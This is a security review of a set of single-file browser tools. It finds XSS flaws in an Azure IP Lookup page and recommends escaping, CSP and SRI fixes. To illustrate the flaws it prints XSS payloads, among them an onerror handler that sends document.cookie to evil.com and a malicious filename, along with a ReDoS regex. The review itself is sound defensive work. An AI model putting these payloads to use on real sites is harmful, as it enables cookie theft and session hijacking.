# Vibetools Security & Code Quality Review

**Date**: 2026-02-08
**Scope**: All 17 tool files in `public/`, plus `index.html`

---

## Executive Summary

The codebase is well-structured — single-file tools with no build step, consistent styling, and a clear separation of concerns. Most tools are low-risk local text transformers. However, **the Azure IP Lookup tool has confirmed XSS vulnerabilities** through malicious JSON files, and several other tools have minor issues worth addressing.

| Severity | Count | Summary |
|----------|-------|---------|
| HIGH     | 1     | XSS via malicious JSON in Azure IP Lookup |
| MEDIUM   | 2     | XSS via filename, missing CSP/SRI |
| LOW      | 4     | Implicit `event`, ReDoS, missing `noopener` |

---

## Deep Dive: Azure IP Lookup (`tools/azure-ip-lookup.html`)

This tool was selected for focused review because it processes **user-uploaded JSON files** and renders their contents into the DOM using `innerHTML` — a combination that makes XSS the primary concern.

### FINDING 1: XSS via unescaped service names (HIGH)

**Location**: `azure-ip-lookup.html:357-363` (`searchServices` function)

```javascript
results.innerHTML = matches.map(v => {
    return `
        <div class="result-item" onclick="this.classList.toggle('expanded')">
            <div class="service-name">
                ${v.name}                          // ← NOT ESCAPED
            </div>
            <div class="service-region">Region: ${region}</div>  // ← NOT ESCAPED
            ...
        </div>
    `;
}).join('');
```

**Impact**: A crafted ServiceTags JSON file with a malicious service name like:

```json
{
  "values": [{
    "name": "<img src=x onerror='fetch(\"https://evil.com?\"+document.cookie)'>",
    "properties": { "addressPrefixes": ["10.0.0.0/8"], "region": "eastus" }
  }]
}
```

...would execute arbitrary JavaScript when the user searches and results render. The attacker could exfiltrate data from the page, redirect the user, or perform actions in the user's browser context.

**Root cause**: `v.name` and `region` are interpolated directly into an innerHTML template string without calling `escapeHtml()`. The `escapeHtml()` function exists in this file (line 459) and is used correctly for IP prefixes on line 365, but the service name and region fields were missed.

**Fix**: Use `escapeHtml(v.name)` and `escapeHtml(region)` in both `searchServices()` (line 360, 362) and `searchIP()` (line 415).

### FINDING 2: XSS via unescaped `data.cloud` (HIGH)

**Location**: `azure-ip-lookup.html:259-260`

```javascript
fileInfo.innerHTML = `✓ Loaded: ${file.name}<br>` +
    `Cloud: <span class="cloud-badge ${getCloudClass(data.cloud)}">${getCloudIcon(data.cloud)} ${data.cloud || 'Unknown'}</span>`;
```

Two unescaped values from the uploaded JSON:
- `file.name` — the OS-level filename; a file named `<img src=x onerror=alert(1)>.json` triggers XSS
- `data.cloud` — arbitrary string from the JSON payload, rendered directly into innerHTML

**Fix**: Escape both `file.name` and `data.cloud` with `escapeHtml()`.

### FINDING 3: XSS via `getCloudClass()` CSS class injection (LOW)

**Location**: `azure-ip-lookup.html:260`

```javascript
`<span class="cloud-badge ${getCloudClass(data.cloud)}">`
```

`getCloudClass()` returns a hardcoded string based on substring matching, but falls through to `'cloud-public'` by default — so this is safe even with malicious input. No action needed.

### FINDING 4: Incomplete `region` escaping in `searchIP` (HIGH)

**Location**: `azure-ip-lookup.html:415`

```javascript
<div class="service-region">Region: ${region}</div>
```

Same issue as Finding 1 but in the IP search path. A malicious region value in the JSON would execute when an IP lookup renders results.

### Summary of Azure IP Lookup issues

The tool correctly uses `escapeHtml()` in some places (IP prefixes on line 365, 418, 422) but misses it in others (service name, region, cloud name, filename). This inconsistency suggests the escaping was applied ad-hoc rather than systematically.

---

## All Other Findings

### CORS Inspector (`tools/cors-inspector.html`) — Well-written

**Assessment**: This tool is well-implemented from a security perspective.

- All innerHTML content is escaped via `escapeHtml()` consistently
- URL input is validated through `new URL()` parsing
- Requests use `AbortController` with a 15-second timeout
- The tool only accepts `http://` and `https://` schemes

**Note on design intent**: The tool makes real `fetch()` requests from the user's browser. This is its explicit, documented purpose ("This tool makes real `fetch()` requests from your browser to test accessibility"). While this could theoretically be used for internal network probing, this is inherent to any browser-based CORS testing tool and is clearly communicated to the user.

### Regex Playground (`tools/regex-playground.html`) — Minor issues

**ReDoS risk (LOW)**: User-supplied regex patterns can cause catastrophic backtracking (e.g., `(a+)+$` against a long string of `a`s). Since this runs client-side in the user's own browser tab, the impact is limited to freezing that tab. The browser's tab process can be killed by the user. No server-side impact.

**HTML escaping**: Correctly implemented. The `highlightLine()` function properly escapes text before wrapping matched portions in `<mark>` tags — it escapes the raw text segments first, then concatenates the markup. This is the correct approach.

### HTML Entity Converter (`converters/html-entity-converter.html`) — Safe pattern

**`textarea.innerHTML` pattern (SAFE)**: Line 131-132 uses `textarea.innerHTML = entities.value` on a detached `<textarea>` element. This is a well-known safe pattern for HTML entity decoding — the textarea element treats innerHTML assignment as text content and only decodes character references (`&amp;` → `&`), without parsing or executing HTML tags.

### JWT Decoder (`decoders/jwt-decoder.html`) — Minor issues

**Implicit `event` variable (LOW)**: Line 357 uses `const btn = event.target;` — relies on the implicit global `event` object rather than receiving it as a function parameter. This works in Chrome and Edge but is non-standard. The same pattern appears in `html-entity-converter.html:150` and other tools.

**HTML escaping**: Properly applied. `claim.value` is escaped with `escapeHtml()` on line 315. `claim.label` values are all hardcoded strings, so they're safe without escaping.

### Unicode Inspector (`converters/unicode-inspector.html`) — Safe

All user input is properly escaped via `escapeHtml()`. The `getCharDescription()` function returns only hardcoded strings. No issues found.

---

## Cross-cutting concerns

### No Content Security Policy (MEDIUM)

None of the tools include a CSP meta tag. Adding one would provide defense-in-depth against XSS:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
```

Since all tools use inline scripts and styles, `'unsafe-inline'` is needed, which limits CSP's effectiveness. However, it would still prevent injection of external scripts (`<script src="https://evil.com/x.js">`), which is the most dangerous XSS payload pattern.

### No Subresource Integrity (SRI) on CDN scripts (MEDIUM)

The JSON-YAML converter loads `js-yaml` from jsDelivr without an `integrity` attribute. If the CDN were compromised, malicious code would execute in the user's browser. Adding SRI is straightforward:

```html
<script src="https://cdn.jsdelivr.net/npm/js-yaml@4.1.0/dist/js-yaml.min.js"
        integrity="sha384-<hash>"
        crossorigin="anonymous"></script>
```

### Missing `rel="noopener noreferrer"` on external links (LOW)

Several tools use `target="_blank"` without `rel="noopener noreferrer"`:
- `azure-ip-lookup.html:199` (Microsoft Download Center link)
- `regex-playground.html:386` (MDN docs link)

Modern browsers default to `noopener` behavior for `target="_blank"`, so this is very low risk in practice.

### Implicit `event` global variable (LOW)

Multiple tools reference the `event` object implicitly in onclick handlers:

```javascript
function copyText(id) {
    // ...
    const btn = event.target;  // implicit global
```

This should be `const btn = event?.target || this;` or the event should be passed explicitly: `onclick="copyText('id', event)"`. While this works in all current major browsers, it's technically non-standard.

---

## Tools with no issues found

The following tools are simple text transformers with no innerHTML, no fetch, no file I/O, and no security-relevant attack surface:

- `converters/base64-cleartext-converter.html`
- `converters/color-converter.html`
- `converters/json-yaml-converter.html` (aside from missing SRI)
- `converters/number-base-converter.html`
- `converters/rot13-converter.html`
- `converters/text-case-converter.html`
- `converters/timestamp-converter.html`
- `converters/url-encoder-decoder.html`
- `checksum/imo-number-validator.html`
- `browser/browser-info.html`
- `browser/locale-info.html`

---

## Recommendations (prioritized)

1. **Fix Azure IP Lookup XSS** — Escape `v.name`, `region`, `data.cloud`, and `file.name` with `escapeHtml()` in all innerHTML assignments. This is the only confirmed exploitable vulnerability.

2. **Add CSP meta tags** — Even with `'unsafe-inline'`, CSP blocks external script injection. Apply to all tools.

3. **Add SRI to CDN scripts** — Pin the js-yaml CDN load with an integrity hash.

4. **Standardize `event` handling** — Pass event explicitly in onclick handlers or use `addEventListener` instead.

5. **Add `rel="noopener noreferrer"`** — On all `target="_blank"` links.
